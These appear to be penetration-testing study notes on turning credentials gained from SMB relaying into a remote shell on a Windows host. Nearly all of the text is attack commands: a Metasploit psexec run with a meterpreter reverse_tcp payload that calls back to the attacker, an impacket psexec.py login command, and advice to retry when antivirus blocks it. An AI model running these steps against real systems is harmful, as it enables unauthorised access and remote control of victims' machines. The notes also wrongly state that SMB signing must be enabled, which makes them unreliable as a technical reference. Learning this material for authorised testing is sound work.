
### Requirements for SMB Relay Shell

1.  SMB signing is enabled [[2.2.2 Identify If target is Vulnerable to SMB Relaying |Identify here]]
2.  You have a username and a password (From the previous task in which you got the hashes)
3. You can the username and password to gain a shell
4. You will use Metasploit or PSEXEC

#### Gaining Shell Access with Metasploit from SMB Relaying

1.  Msfconsole
2.  search psexec
3.  use exploit/windows/smb/psexec
4.  Options
5.  Set RHOSTS (IP Address)
6.  Set smbdomain (domain name)
7.  Set smbpass (Password0
8.  Set smbuser (username)

![image1](image1-93.png)

9.  Set payload windows/x64/meterpreter/reverse_tcp

![image2](image2-44.png)

10. Set lhosts eth0
11. Run

![image3](image3-30.png)

It might or might not always work,

- You can try running it 3 times and see
- As seen above the antivirus block the attack so you can try other methods

### Using PSEXEC to get Shell Access 

Use the below command:
```powershell 
psexec.py (domainname)/username:password@ip_address
```

![image4](image4-20.png)

